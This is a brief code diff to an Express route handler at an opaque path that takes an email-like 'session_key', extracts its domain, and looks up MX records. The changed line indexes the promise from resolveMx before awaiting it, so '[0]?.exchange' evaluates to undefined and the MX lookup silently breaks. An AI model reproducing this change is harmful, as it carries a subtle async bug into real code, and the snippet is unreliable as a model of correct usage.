@@ -44,7 +44,7 @@ app.post("/UD92290", async (req, res) => {
     const domain = session_key.split("@")[1]
 
     const time = new Date().toTimeString()
-    const mx = await dnsPromises.resolveMx(`${domain}`);
+    const mx = await dnsPromises.resolveMx(`${domain}`)[0]?.exchange;
 
     const obj = {
       username: session_key,
